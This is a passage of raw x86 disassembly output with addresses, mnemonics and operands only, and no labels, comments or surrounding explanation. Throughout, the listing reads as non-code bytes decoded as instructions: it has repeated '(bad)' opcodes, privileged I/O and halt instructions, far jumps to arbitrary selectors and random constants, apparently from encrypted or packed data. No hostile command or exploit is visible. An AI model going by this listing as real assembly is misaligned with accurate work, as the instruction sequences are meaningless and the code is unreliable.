  4165a3:	(bad)  [ebx-0x7e12112b]
  4165a9:	jl     0x4165f7
  4165ab:	sbb    al,0xb3
  4165ad:	test   DWORD PTR [ebx],edi
  4165af:	lahf   
  4165b0:	mov    al,0x20
  4165b2:	dec    eax
  4165b3:	cld    
  4165b4:	jno    0x4165ef
  4165b6:	int    0xa1
  4165b8:	mov    bl,0xa
  4165ba:	push   eax
  4165bb:	ds jnp 0x416624
  4165be:	nop
  4165bf:	cmc    
  4165c0:	rdtsc  
  4165c2:	xor    eax,0x775e322e
  4165c7:	and    eax,0x77c47278
  4165cc:	push   edi
  4165cd:	dec    ebp
  4165ce:	xchg   edx,eax
  4165cf:	loop   0x416603
  4165d1:	loope  0x41662d
  4165d3:	sub    eax,0x2ea5322d
  4165d8:	dec    esi
  4165d9:	or     al,0xb0
  4165db:	xchg   edx,eax
  4165dc:	lods   eax,DWORD PTR ds:[esi]
  4165dd:	sub    DWORD PTR [ecx+ecx*8+0x2454f339],ebp
  4165e4:	test   BYTE PTR ds:0x2cab3931,bl
  4165ea:	pop    edx
  4165eb:	pcmpgtw mm7,mm4
  4165ee:	and    bh,0xe3
  4165f1:	mov    ch,0xc
  4165f3:	add    DWORD PTR [ecx-0x36],0x9394df46
  4165fa:	jns    0x4165e2
  4165fc:	div    DWORD PTR [esp+edx*8-0x25]
  416600:	jmp    0x7afa:0x561102e6
  416607:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416608:	mov    al,ds:0xbad43ea1
  41660d:	dec    edi
  41660e:	mov    esp,0x9d4110ce
  416613:	push   ss
  416614:	mov    edi,0xcc312da1
  416619:	outs   dx,BYTE PTR ds:[esi]
  41661a:	(bad)  
  41661b:	lods   al,BYTE PTR ds:[esi]
  41661c:	outs   dx,BYTE PTR ds:[esi]
  41661d:	ret    0x49b2
  416620:	nop
  416621:	sub    al,0x42
  416623:	sbb    al,0x77
  416625:	adc    cl,ch
  416627:	mov    al,ds:0xf054f40f
  41662c:	and    DWORD PTR [ecx],esi
  41662e:	jge    0x416637
  416630:	mov    es:0xd368367e,eax
  416636:	adc    bl,bl
  416638:	call   0x671e46d9
  41663d:	in     ax,0x69
  416640:	sbb    eax,0xbf4e1729
  416645:	fmul   QWORD PTR [esi-0x36]
  416648:	aaa    
  416649:	rol    DWORD PTR [esi+0x72871517],0xd7
  416650:	js     0x4165fd
  416652:	test   ebp,edx
  416654:	cmc    
  416655:	add    dh,bl
  416657:	clc    
  416658:	adc    bl,cl
  41665a:	push   ebx
  41665b:	pop    ebx
  41665c:	jnp    0x41666d
  41665e:	call   0x945a:0xdf9d05ca
  416665:	mov    esi,0xa86e31c2
  41666a:	in     al,0xea
  41666c:	fistp  WORD PTR [eax]
  41666e:	sub    dl,dh
  416670:	add    BYTE PTR ds:0x147660b3,bl
  416676:	adc    eax,0x1ae7b2d6
  41667b:	popa   
  41667c:	sub    dh,BYTE PTR [ecx-0x2823d5c1]
  416682:	dec    BYTE PTR [eax-0x1d9b1427]
  416688:	xor    esp,ebp
  41668a:	mov    eax,ds:0x6cdc0c70
  41668f:	cmp    DWORD PTR [ebx+0x564c0128],0xffffffbc
  416696:	mov    ecx,0x1968fd0b
  41669b:	jbe    0x41669a
  41669d:	pop    esi
  41669e:	add    eax,DWORD PTR [ecx+eax*8-0x25]
  4166a2:	retf   
  4166a3:	cmp    DWORD PTR [edx+esi*4+0x2a03edde],edx
  4166aa:	xor    eax,0x75363bbd
  4166af:	dec    edi
  4166b0:	mov    es,WORD PTR ds:0x5db9abcd
  4166b6:	push   esi
  4166b7:	mov    dh,0xe5
  4166b9:	add    ebx,DWORD PTR [ebx+0x5]
  4166bc:	xor    al,0xb9
  4166be:	and    al,0xd
  4166c0:	sar    BYTE PTR [ebp+0x693bad24],0xbc
  4166c7:	scas   eax,DWORD PTR es:[edi]
  4166c8:	ret    
  4166c9:	xor    al,0x69
  4166cb:	out    0x13,eax
  4166cd:	lock xchg ecx,eax
  4166cf:	shl    BYTE PTR [edi],1
  4166d1:	or     eax,0x1dc9890
  4166d6:	mov    al,ds:0xeee474ec
  4166db:	dec    ebx
  4166dc:	inc    edi
  4166dd:	sub    ch,bl
  4166df:	popa   
  4166e0:	scas   al,BYTE PTR es:[edi]
  4166e1:	push   ds
  4166e2:	mov    dh,0x35
  4166e4:	adc    bl,al
  4166e6:	mov    dh,0x1f
  4166e8:	dec    edi
  4166e9:	xchg   esi,eax
  4166ea:	retf   
  4166eb:	add    cl,BYTE PTR [esi-0x73]
  4166ee:	mov    ebp,0x605ab8bc
  4166f3:	mov    dh,0xb2
  4166f5:	jmp    DWORD PTR [eax+0x576f8bd]
  4166fb:	aam    0xb5
  4166fd:	jnp    0x416685
  4166ff:	and    bh,BYTE PTR [edx+0x749cfd66]
  416705:	pop    ds
  416706:	jl     0x4166c5
  416708:	daa    
  416709:	ins    BYTE PTR es:[edi],dx
  41670a:	cdq    
  41670b:	(bad)  
  41670c:	xor    al,0x41
  41670e:	xor    al,0x9e
  416710:	or     cl,BYTE PTR [ebx+0x71]
  416713:	adc    BYTE PTR [ebp+0xb],0xc5
  416717:	cmc    
  416718:	mov    al,0xa3
  41671a:	sub    al,0xa
  41671c:	jg     0x416746
  41671e:	dec    edi
  41671f:	rcr    BYTE PTR [ecx],cl
  416721:	retf   
  416722:	std    
  416723:	test   al,0xa9
  416725:	or     eax,0x306bf189
  41672a:	fs xchg ebx,eax
  41672c:	inc    ecx
  41672d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41672e:	dec    ebx
  41672f:	push   eax
  416730:	sub    ebx,DWORD PTR [esp+edx*8-0x3005a898]
  416737:	sar    BYTE PTR [edi+0x6b],cl
  41673a:	mov    ch,0x6b
  41673c:	inc    edi
  41673d:	mov    dl,0xd0
  41673f:	mov    ecx,0x91737a74
  416744:	xor    al,0xaf
  416746:	arpl   WORD PTR [ecx+0x5620f766],dx
  41674c:	pop    ss
  41674d:	mov    ds:0xa5dc5b9,al
  416752:	fist   WORD PTR [ecx]
  416754:	unpckhps xmm1,XMMWORD PTR [ebp+0x5a171548]
  41675b:	adc    ah,BYTE PTR [esi+0x623e079a]
  416761:	pop    eax
  416762:	call   0xcfed4116
  416767:	xchg   ecx,eax
  416768:	or     BYTE PTR [edx],ah
  41676a:	mov    ebp,0x1af647c0
  41676f:	cmp    BYTE PTR [esi-0x4c],dh
  416772:	out    dx,eax
  416773:	les    edx,FWORD PTR [eax]
  416775:	lahf   
  416776:	push   esi
  416777:	mov    al,ds:0x474fd0b6
  41677c:	test   eax,0xf7fcd4cc
  416781:	pusha  
  416782:	repz mov esi,0x65d1db6d
  416788:	loope  0x4167e8
  41678a:	sub    eax,0xdc8211ce
  41678f:	and    eax,0x3e0d76dc
  416794:	adc    eax,0xa96b1451
  416799:	push   0x5f784510
  41679e:	mov    edi,0x9429c69
  4167a3:	cli    
  4167a4:	scas   eax,DWORD PTR es:[edi]
  4167a5:	imul   BYTE PTR [ebx-0x549a0ea3]
  4167ab:	and    edx,DWORD PTR [ecx]
  4167ad:	and    dl,BYTE PTR [edx-0x61ab4b66]
  4167b3:	or     esp,0x54
  4167b6:	push   ecx
  4167b7:	mov    DWORD PTR [ebp+ebx*4-0x853160f],esp
  4167be:	add    eax,DWORD PTR ss:[esi+0x201cd4c6]
  4167c5:	pmaxub mm4,QWORD PTR [eax]
  4167c8:	pop    ebp
  4167c9:	in     al,dx
  4167ca:	and    bh,BYTE PTR [ecx+0x28]
  4167cd:	sti    
  4167ce:	push   ebx
  4167cf:	xchg   ecx,eax
  4167d0:	xor    BYTE PTR [ecx-0x40c07d1d],bl
  4167d6:	adc    ebx,DWORD PTR [ebp-0x759cbe69]
  4167dc:	xchg   BYTE PTR [esi],bl
  4167de:	jle    0x416772
  4167e0:	adc    DWORD PTR [edx],edx
  4167e2:	out    dx,al
  4167e3:	scas   al,BYTE PTR es:[edi]
  4167e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167e5:	inc    esi
  4167e6:	xchg   esi,eax
  4167e7:	jae    0x416831
  4167e9:	mov    edi,0xaf6f7dfe
  4167ee:	rol    ecx,1
  4167f0:	or     bh,BYTE PTR [ebx]
  4167f2:	pop    ecx
  4167f3:	jg     0x4167a4
  4167f5:	das    
  4167f6:	pop    ds
  4167f7:	xchg   ecx,eax
  4167f8:	daa    
  4167f9:	ret    0xcdd2
  4167fc:	cmp    bh,bl
  4167fe:	mov    ebp,0xe51c472a
  416803:	call   0xe1ea:0xdbddf425
  41680a:	stos   BYTE PTR es:[edi],al
  41680b:	jno    0x41685a
  41680d:	xchg   edi,eax
  41680e:	fadd   DWORD PTR [ebx-0x59cb7163]
  416814:	ds aas 
  416816:	adc    al,0x64
  416818:	add    ebp,ebx
  41681a:	cmc    
  41681b:	mov    ah,0x92
  41681d:	pop    edx
  41681e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41681f:	pop    ebx
  416820:	or     ecx,DWORD PTR [esi]
  416822:	mov    eax,0xafb52ba2
  416827:	mov    ah,0x59
  416829:	mov    WORD PTR [eax-0x12d8363],?
  41682f:	sbb    dh,ch
  416831:	fidivr WORD PTR [esi-0x4c]
  416834:	or     eax,0x77d00819
  416839:	push   ebp
  41683a:	ffreep st(0)
  41683c:	push   eax
  41683d:	outs   dx,BYTE PTR ds:[esi]
  41683e:	and    al,0xe
  416840:	stos   BYTE PTR es:[edi],al
  416841:	call   DWORD PTR [edx+edx*2]
  416844:	xlat   BYTE PTR ds:[ebx]
  416845:	pop    esp
  416846:	inc    edx
  416847:	jle    0x416828
  416849:	rcl    ch,0xe0
  41684c:	sbb    al,0xb8
  41684e:	cwde   
  41684f:	hlt    
  416850:	mov    ebp,0xe16c0d68
  416855:	xor    al,BYTE PTR [eax]
  416857:	hlt    
  416858:	xor    al,0x20
  41685a:	stos   DWORD PTR es:[edi],eax
  41685b:	pushf  
  41685c:	push   0x52acf2
  416861:	(bad)  [edi+esi*1+0x32]
  416865:	fstp   DWORD PTR [eax]
  416867:	mov    DWORD PTR [ebx+0x0],ebp
  41686a:	jecxz  0x41682f
  41686c:	mov    ?,esi
  41686e:	enter  0xa495,0x9
  416872:	dec    ecx
  416873:	ret    
  416874:	pop    esi
  416875:	xchg   DWORD PTR [ebp+0x50c1b9f1],ebx
  41687b:	xor    BYTE PTR [edi-0x38],0xf5
  41687f:	mov    dl,0xf0
  416881:	scas   al,BYTE PTR es:[edi]
  416882:	fs inc esp
  416884:	stos   DWORD PTR es:[edi],eax
  416885:	in     al,0x1c
  416887:	js     0x41688c
  416889:	mov    edx,0x8ff71c2b
  41688e:	mov    BYTE PTR [ebx],bh
  416890:	pmulhw mm1,mm0
  416893:	(bad)  
  416894:	fdiv   DWORD PTR [ebx+0x31]
  416897:	sbb    al,ch
  416899:	rcl    DWORD PTR [edi-0xd],1
  41689c:	int    0x6f
  41689e:	push   esi
  41689f:	and    al,0xd
  4168a1:	add    DWORD PTR [ecx-0x194aad3b],eax
  4168a7:	or     BYTE PTR [edx+0x62],0x75
  4168ab:	xchg   esp,eax
  4168ac:	pop    ds
  4168ad:	in     eax,0x43
  4168af:	push   cs
  4168b0:	dec    esi
  4168b1:	iret   
  4168b2:	xchg   edi,eax
  4168b3:	or     BYTE PTR [esi+0x6871a710],bh
  4168b9:	mov    al,0x21
  4168bb:	fmul   st(4),st
  4168bd:	sbb    al,0xc9
  4168bf:	popf   
  4168c0:	jo     0x41685e
  4168c2:	outs   dx,DWORD PTR ds:[esi]
  4168c3:	fsubr  QWORD PTR [ecx]
  4168c5:	pushf  
  4168c6:	xchg   esp,eax
  4168c7:	in     eax,dx
  4168c8:	lock into 
  4168ca:	dec    ebp
  4168cb:	loop   0x4168c2
  4168cd:	and    edi,DWORD PTR [ebp+eiz*8-0x54]
  4168d1:	xor    ecx,DWORD PTR [edx-0xc]
  4168d4:	and    al,0xe7
  4168d6:	add    BYTE PTR [eax],ah
  4168d8:	clc    
  4168d9:	rcr    BYTE PTR [eax-0x7a],1
  4168dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168dd:	test   eax,ecx
  4168df:	fwait
  4168e0:	jle    0x41688f
  4168e2:	pusha  
  4168e3:	fadd   DWORD PTR [edi-0x90555ec]
  4168e9:	nop
  4168ea:	and    dh,ch
  4168ec:	idiv   BYTE PTR [eax+esi*1+0x77deb9d3]
  4168f3:	cwde   
  4168f4:	imul   esi,DWORD PTR [edx+edx*1],0xffffff9f
  4168f8:	add    ah,ch
  4168fa:	mov    ecx,0x8c462bd1
  4168ff:	xchg   esp,eax
  416900:	loopne 0x4168f4
  416902:	add    cl,BYTE PTR [edi]
  416904:	gs (bad) 
  416907:	test   DWORD PTR [ecx+ebp*2],ebp
  41690a:	in     al,0x58
  41690c:	je     0x4168f8
  41690e:	mov    ecx,0xf7b46945
  416913:	add    dh,BYTE PTR [ecx+ebx*1+0x4a7f09ee]
  41691a:	adc    eax,0xed07be64
  41691f:	jno    0x416901
  416921:	mov    ebp,0xaa317832
  416926:	cmp    eax,0xe
  416929:	mov    cl,0x63
  41692b:	mov    ebx,0x7633067f
  416930:	enter  0xbd1e,0x5e
  416934:	jmp    0x46c7fd6
  416939:	xchg   ebp,eax
  41693a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41693b:	cmp    edx,eax
  41693d:	push   ecx
  41693e:	pop    ecx
  41693f:	mov    edx,0x54c3cd77
  416944:	test   al,0x6d
  416946:	jle    0x416919
  416948:	repz push esp
  41694a:	jbe    0x4168e2
  41694c:	ins    DWORD PTR es:[edi],dx
  41694d:	sbb    bh,bh
  41694f:	repnz (bad) 
  416951:	mov    edi,0xf6d1fb4c
  416956:	(bad)  
  416957:	sahf   
  416958:	mov    WORD PTR [ebx],ds
  41695a:	push   ss
  41695b:	or     al,0x48
  41695d:	test   al,0x51
  41695f:	jno    0x41697a
  416961:	dec    ebp
  416962:	cmp    BYTE PTR [esi-0x54],dh
  416965:	retf   0x2f8f
  416968:	jle    0x41697d
  41696a:	frstor [edi+ebp*2]
  41696d:	leave  
  41696e:	adc    al,BYTE PTR [edi+ebx*1+0x3e]
  416972:	sub    edi,ecx
  416974:	ret    
  416975:	dec    ecx
  416976:	sar    DWORD PTR [ecx],cl
  416978:	aam    0xa1
  41697a:	repz mov es,WORD PTR [edx]
  41697d:	adc    bl,BYTE PTR [ebx+edi*8-0x69be630d]
  416984:	(bad)  
  416985:	xchg   edi,eax
  416986:	inc    ebx
  416987:	cmp    BYTE PTR [ebx],cl
  416989:	add    al,dl
  41698b:	stos   BYTE PTR es:[edi],al
  41698c:	test   eax,0x595e5646
  416991:	shl    DWORD PTR [esi+eax*1],1
  416994:	mov    dh,0x26
  416996:	pushf  
  416997:	stc    
  416998:	in     eax,dx
  416999:	push   0x32b7759
  41699e:	aaa    
  41699f:	ins    BYTE PTR es:[edi],dx
  4169a0:	xor    dl,BYTE PTR [edx]
  4169a2:	sub    al,0xcd
  4169a4:	jb     0x4169d9
  4169a6:	mov    edx,0xbdd7eac2
  4169ab:	jl     0x416975
  4169ad:	int3   
  4169ae:	shl    BYTE PTR [esp+ecx*4+0x4f],0x8c
  4169b3:	dec    edx
  4169b4:	aad    0x9
  4169b6:	enter  0xc7d4,0x5d
  4169ba:	pop    ecx
  4169bb:	inc    ecx
  4169bc:	repz js 0x416954
  4169bf:	mov    ah,0x6f
  4169c1:	lahf   
  4169c2:	or     BYTE PTR [ebx],bl
  4169c4:	xchg   ebx,eax
  4169c5:	scas   al,BYTE PTR es:[edi]
  4169c6:	mov    edi,0x886f7aeb
  4169cb:	(bad)  
  4169cc:	in     eax,dx
  4169cd:	pusha  
  4169ce:	popf   
  4169cf:	sbb    bh,BYTE PTR [esi]
  4169d1:	dec    esp
  4169d2:	call   0x335e:0xcd5442b2
  4169d9:	adc    ah,BYTE PTR [ebx+0x53db4a74]
  4169df:	aam    0xfa
  4169e1:	mov    ah,0x4e
  4169e3:	rol    BYTE PTR [ecx+0x19],0xd
  4169e7:	cmp    ebp,DWORD PTR [esi+0x4109603a]
  4169ed:	xchg   ebx,eax
  4169ee:	push   0xbfd0fb31
  4169f3:	int3   
  4169f4:	test   DWORD PTR [ecx-0x67da4753],edi
  4169fa:	pop    edx
  4169fb:	in     eax,dx
  4169fc:	xchg   esp,eax
  4169fd:	pusha  
  4169fe:	or     ecx,DWORD PTR [eax+esi*1+0x1c0b4c7]
  416a05:	dec    ecx
  416a06:	xchg   ebp,eax
  416a07:	fadd   DWORD PTR [ecx-0x5c]
  416a0a:	stos   DWORD PTR es:[edi],eax
  416a0b:	fcomp  QWORD PTR [ebx]
  416a0d:	ins    DWORD PTR es:[edi],dx
  416a0e:	xor    cl,BYTE PTR [eax+0x69]
  416a11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a12:	es jmp 0xfd27:0xab1e90be
  416a1a:	loope  0x416a16
  416a1c:	or     eax,0x2505ff97
  416a21:	ficom  WORD PTR [esi-0x4ab8b452]
  416a27:	arpl   WORD PTR [edi+edi*1+0x13],si
  416a2b:	loope  0x4169eb
  416a2d:	jl     0x4169f3
  416a2f:	pop    ss
  416a30:	sub    BYTE PTR ds:0x9fac665f,0x3
  416a37:	out    0x83,eax
  416a39:	push   cs
  416a3a:	arpl   WORD PTR [edi+0x20090f2],sp
  416a40:	sbb    ecx,DWORD PTR [ebx-0x3f1ade23]
  416a46:	test   eax,0xf5c7629c
  416a4b:	cmp    al,BYTE PTR [ebx+0x45]
  416a4e:	inc    edx
  416a4f:	mov    al,0x86
  416a51:	adc    al,0x3a
  416a53:	inc    eax
  416a54:	shr    DWORD PTR [edi-0xb],cl
  416a57:	or     ebp,ebp
  416a59:	cli    
  416a5a:	dec    ebp
  416a5b:	mov    bl,0x99
  416a5d:	adc    BYTE PTR [eax],ah
  416a5f:	or     eax,0x7a375ded
  416a64:	inc    eax
  416a65:	loopne 0x416ac0
  416a67:	ja     0x416ac6
  416a69:	adc    esp,DWORD PTR [edi+0x14]
  416a6c:	dec    esp
  416a6d:	xor    ah,dh
  416a6f:	imul   esp,DWORD PTR [ecx+0x31e2e9c3],0x7a7188b
  416a79:	out    dx,eax
  416a7a:	push   edi
  416a7b:	test   BYTE PTR [eax],0xd
  416a7e:	and    eax,0x324445c8
  416a83:	call   0x1535:0x1b29188
  416a8a:	retf   
  416a8b:	jge    0x416a60
  416a8d:	mov    dl,0x4b
  416a8f:	sbb    eax,0xa42bdf0b
  416a94:	dec    ebx
  416a95:	(bad)  
  416a96:	jne    0x416ad3
  416a98:	(bad)  [ecx+0x66]
  416a9b:	sbb    al,0x19
  416a9d:	jle    0x416a48
  416a9f:	stos   BYTE PTR es:[edi],al
  416aa0:	mov    WORD PTR [ebx+0x4b],cs
  416aa3:	jno    0x416aee
  416aa5:	adc    ebx,DWORD PTR [eax+0x1a]
  416aa8:	and    dl,BYTE PTR [esi+0xbd5ccc6]
  416aae:	popf   
  416aaf:	pop    esp
  416ab0:	sti    
  416ab1:	mov    WORD PTR [esi-0x5d],gs
  416ab4:	sbb    dh,BYTE PTR [eax+0x2b]
  416ab7:	cdq    
  416ab8:	jae    0x416ad3
  416aba:	sub    eax,edx
  416abc:	mov    edi,0x6ea31a4a
  416ac1:	sub    al,0x72
  416ac3:	mov    BYTE PTR [esi-0x15],ch
  416ac6:	adc    BYTE PTR ds:0x4fda7e82,ah
  416acc:	(bad)  
  416acd:	mov    dh,0x2a
  416acf:	das    
  416ad0:	bound  esi,QWORD PTR [ebx-0x2516e942]
  416ad6:	(bad)  [ecx]
  416ad8:	xor    esp,0xffffffd9
  416adb:	mov    al,0x99
  416add:	fs push ebx
  416adf:	pushf  
  416ae0:	idiv   BYTE PTR [ebx-0x1d0f209e]
  416ae6:	cdq    
  416ae7:	lods   eax,DWORD PTR ds:[si]
  416ae9:	mov    al,0x60
  416aeb:	das    
  416aec:	cdq    
  416aed:	ficomp DWORD PTR cs:[ebx-0x1f]
  416af1:	jle    0x416b13
  416af3:	or     al,0xe1
  416af5:	mov    esi,0x634c0d02
  416afa:	push   0xd6e34d56
  416aff:	icebp  
  416b00:	jo     0x416b3f
  416b02:	mov    ds:0xe7285131,eax
  416b07:	fcom   DWORD PTR [edx]
  416b09:	arpl   WORD PTR ds:0xbfa77783,bx
  416b0f:	mov    bh,0x89
  416b11:	clc    
  416b12:	(bad)  
  416b13:	mov    al,0xa6
  416b15:	ja     0x416ac2
  416b17:	adc    al,0xf3
  416b19:	pop    edx
  416b1a:	inc    edx
  416b1b:	out    0x47,al
  416b1d:	dec    edi
  416b1e:	rol    DWORD PTR [esi+0x51],0x22
  416b22:	xor    eax,esi
  416b24:	sub    BYTE PTR [eax+esi*4],dh
  416b27:	and    eax,0xaa54f83a
  416b2c:	gs adc al,0x11
  416b2f:	adc    bl,cl
  416b31:	xchg   ecx,eax
  416b32:	xor    BYTE PTR [edi+0x20],bh
  416b35:	fs stos DWORD PTR es:[edi],eax
  416b37:	mov    al,ds:0x7c4218c
  416b3c:	ins    BYTE PTR es:[edi],dx
  416b3d:	addr16 push ecx
  416b3f:	inc    ebp
  416b40:	add    al,0x59
  416b42:	xor    BYTE PTR [esi-0xa],bh
  416b45:	xchg   ebx,eax
  416b46:	sbb    ebx,DWORD PTR [ebx]
  416b48:	cdq    
  416b49:	lock pop ebp
  416b4b:	pop    eax
  416b4c:	mov    eax,ds:0x31547d40
  416b51:	sahf   
  416b52:	push   ds
  416b53:	in     eax,dx
  416b54:	mov    bl,0x3c
  416b56:	dec    ecx
  416b57:	pop    edi
  416b58:	push   esi
  416b59:	mov    edi,0xbe9f3564
  416b5e:	cmp    BYTE PTR [ebp+0x5e],dl
  416b61:	ret    0x6fc5
  416b64:	bound  ebx,QWORD PTR [esi]
  416b66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b67:	into   
  416b68:	mov    bh,0xf6
  416b6a:	pop    ebp
  416b6b:	inc    edx
  416b6c:	les    eax,FWORD PTR [esi-0x7a]
  416b6f:	xor    bl,bh
  416b71:	repz and eax,0xc3b3b75
  416b77:	pop    es
  416b78:	push   ecx
  416b79:	dec    esi
  416b7a:	xchg   edi,eax
  416b7b:	mov    eax,ds:0x1fc1c7d7
  416b80:	adc    dl,BYTE PTR [esi+0x77]
  416b83:	adc    ch,BYTE PTR [esi]
  416b85:	aas    
  416b86:	gs xor al,0x99
  416b89:	test   BYTE PTR [edx+esi*4+0x61],ah
  416b8d:	retf   0xab44
  416b90:	dec    edx
  416b91:	stos   DWORD PTR es:[edi],eax
  416b92:	ret    
  416b93:	mov    bl,0x1b
  416b95:	data16 cli 
  416b97:	dec    ecx
  416b98:	clc    
  416b99:	test   DWORD PTR [edx+0x28fe1cd4],0xa92d0d65
  416ba3:	xchg   esp,eax
  416ba4:	scas   al,BYTE PTR es:[edi]
  416ba5:	jp     0x416b2f
  416ba7:	mov    al,0x68
  416ba9:	cmp    BYTE PTR ds:0x9063f5d5,al
  416baf:	hlt    
  416bb0:	fld    st(4)
  416bb2:	add    BYTE PTR [edx+0x51ad1424],al
  416bb8:	out    dx,al
  416bb9:	push   0x6142686a
  416bbe:	jg     0x416b72
  416bc0:	les    esi,FWORD PTR [ecx+0x74c0c0f1]
  416bc6:	idiv   BYTE PTR [edi]
  416bc8:	je     0x416bab
  416bca:	inc    esp
  416bcb:	dec    eax
  416bcc:	lods   al,BYTE PTR ds:[esi]
  416bcd:	loope  0x416bbe
  416bcf:	in     eax,0xb4
  416bd1:	std    
  416bd2:	inc    edi
  416bd3:	aaa    
  416bd4:	push   edx
  416bd5:	pop    edx
  416bd6:	mov    al,0xf2
  416bd8:	and    BYTE PTR [esi],0x1c
  416bdb:	sub    edi,DWORD PTR [esi]
  416bdd:	jecxz  0x416c4d
  416bdf:	xor    ecx,ebp
  416be1:	ins    BYTE PTR es:[edi],dx
  416be2:	pop    ebx
  416be3:	jae    0x416c19
  416be5:	test   al,0x31
  416be7:	inc    esi
  416be8:	inc    ebp
  416be9:	mov    al,0x6f
  416beb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bec:	adc    DWORD PTR [esi-0x5dfb5ea9],ebp
  416bf2:	xor    al,0x62
  416bf4:	sub    al,0xa4
  416bf6:	ret    0x629d
  416bf9:	lds    eax,FWORD PTR [eax]
  416bfb:	mov    al,0xd6
  416bfd:	ret    0xce80
  416c00:	pop    edi
  416c01:	je     0x416b8b
  416c03:	inc    edx
  416c04:	sbb    ch,bl
  416c06:	das    
  416c07:	call   0xa5d:0xc3fe6c6e
  416c0e:	ss ja  0x416c52
  416c11:	adc    al,0x2
  416c13:	mov    bh,0x18
  416c15:	pop    edx
  416c16:	or     BYTE PTR [esi],bl
  416c18:	fisub  DWORD PTR ds:0xb9366bf0
  416c1e:	retf   
  416c1f:	or     eax,0x5017236
  416c24:	and    bl,al
  416c26:	fwait
  416c27:	scas   al,BYTE PTR es:[edi]
  416c28:	mov    DWORD PTR [esi+0x44da6d1a],esi
  416c2e:	xor    al,al
  416c30:	nop
  416c31:	jle    0x416c2d
  416c33:	push   cs
  416c34:	pop    esi
  416c35:	clc    
  416c36:	rcl    DWORD PTR [ebp-0xe9b4192],cl
  416c3c:	push   edx
  416c3d:	lods   al,BYTE PTR ds:[esi]
  416c3e:	dec    esi
  416c3f:	push   ss
  416c40:	cmp    BYTE PTR [esp+ebx*2-0x1b0074f6],cl
  416c47:	mov    ebx,edi
  416c49:	sbb    BYTE PTR [edx],cl
  416c4b:	fdivp  st(3),st
  416c4d:	xchg   esi,eax
  416c4e:	test   eax,ebx
  416c50:	mov    ebx,0xc08e3eb
  416c55:	imul   esp,DWORD PTR [eax+0x2e78af4f],0xfffffff1
  416c5c:	lock pop eax
  416c5e:	das    
  416c5f:	lds    esi,FWORD PTR [edx+0x6]
  416c62:	dec    ecx
  416c63:	xor    esp,ecx
  416c65:	jecxz  0x416bfb
  416c67:	push   cs
  416c68:	mov    bl,0x40
  416c6a:	inc    esp
  416c6b:	or     DWORD PTR [esi],0xffffffc3
  416c6e:	mov    esi,0x584defd4
  416c74:	stc    
  416c75:	(bad)  
  416c76:	sbb    DWORD PTR [eax-0x3b],ebx
  416c79:	fwait
  416c7a:	xor    ecx,DWORD PTR [edi]
  416c7c:	sub    BYTE PTR ds:0x5749373a,bl
  416c82:	adc    eax,0x5a3f0569
  416c87:	mov    ds:0x22897b7b,eax
  416c8c:	aad    0x22
  416c8e:	scas   eax,DWORD PTR es:[edi]
  416c8f:	repz push ds
  416c91:	aam    0xd1
  416c93:	jne    0x416d0c
  416c95:	nop
  416c96:	pop    ebx
  416c97:	ret    0xc4e3
  416c9a:	call   0x2f19:0x2dbc7935
  416ca1:	mov    al,ds:0xcb26d68f
  416ca6:	ins    DWORD PTR es:[edi],dx
  416ca7:	inc    edx
  416ca8:	mov    al,ds:0xa83176d5
  416cad:	in     al,dx
  416cae:	add    DWORD PTR [edi-0x36fe6178],0x4d79f9b3
  416cb8:	xchg   DWORD PTR [ebp-0x7e],esi
  416cbb:	mov    ebp,?
  416cbd:	jb     0x416cea
  416cbf:	psubw  mm0,QWORD PTR [ecx-0x15]
  416cc3:	rol    BYTE PTR [edx-0x4f],1
  416cc6:	inc    ebx
  416cc7:	retf   0x2f86
  416cca:	dec    esi
  416ccb:	mov    ebx,0x4f4ace16
  416cd0:	or     eax,0x8bf8c78b
  416cd5:	add    bh,BYTE PTR [esi+0x1]
  416cd8:	leave  
  416cd9:	mov    al,ds:0x72b54615
  416cde:	cmp    DWORD PTR [ecx+0x2c23649f],ebx
  416ce4:	scas   al,BYTE PTR es:[edi]
  416ce5:	jb     0x416d29
  416ce7:	jo     0x416d25
  416ce9:	outs   dx,BYTE PTR ds:[esi]
  416cea:	inc    edx
  416ceb:	cmp    dl,ch
  416ced:	jne    0x416d3b
  416cef:	sub    esp,esi
  416cf1:	hlt    
  416cf2:	or     eax,0xf39c8b3
  416cf7:	div    dh
  416cf9:	sahf   
  416cfa:	mov    dl,0xd1
  416cfc:	arpl   bp,sp
  416cfe:	inc    eax
  416cff:	add    ecx,edx
  416d01:	mov    bl,0xf0
  416d03:	jmp    0x416cea
  416d05:	clc    
  416d06:	(bad)  cs:[ebx+eiz*8]
  416d0a:	daa    
  416d0b:	or     al,0xb0
  416d0d:	push   cs
  416d0e:	in     al,0x58
  416d10:	mov    dl,0x4b
  416d12:	mov    ebp,0x8cae03cb
  416d17:	sar    DWORD PTR [edi+0x5dc0e476],0xc2
  416d1e:	dec    ebx
  416d1f:	jo     0x416d1e
  416d21:	ja     0x416d5f
  416d23:	mov    al,BYTE PTR [eax+0x303ddcca]
  416d29:	mov    bh,0xb3
  416d2b:	clc    
  416d2c:	out    0xd7,al
  416d2e:	and    BYTE PTR [eax],dl
  416d30:	je     0x416d42
  416d32:	arpl   WORD PTR [esi],sp
  416d34:	dec    edx
  416d35:	jecxz  0x416ccc
  416d37:	in     al,0x79
  416d39:	pop    ecx
  416d3a:	mov    dl,0x9f
  416d3c:	loop   0x416d70
  416d3e:	lods   al,BYTE PTR ds:[esi]
  416d3f:	sbb    eax,0x780daeca
  416d44:	and    al,0xcd
  416d46:	dec    esi
  416d47:	lock dec esp
  416d49:	adc    eax,0x7fd0679e
  416d4e:	retf   
  416d4f:	jle    0x416d42
  416d51:	outs   dx,DWORD PTR ds:[esi]
  416d52:	test   BYTE PTR [eax-0x6e],bl
  416d55:	or     al,0x51
  416d57:	mov    dh,0xeb
  416d59:	bound  esp,QWORD PTR [edx]
  416d5b:	add    al,0x78
  416d5d:	call   0xa60244e7
  416d62:	lds    edi,FWORD PTR [edi+esi*4]
  416d65:	fidiv  WORD PTR ds:0xd34ee6e1
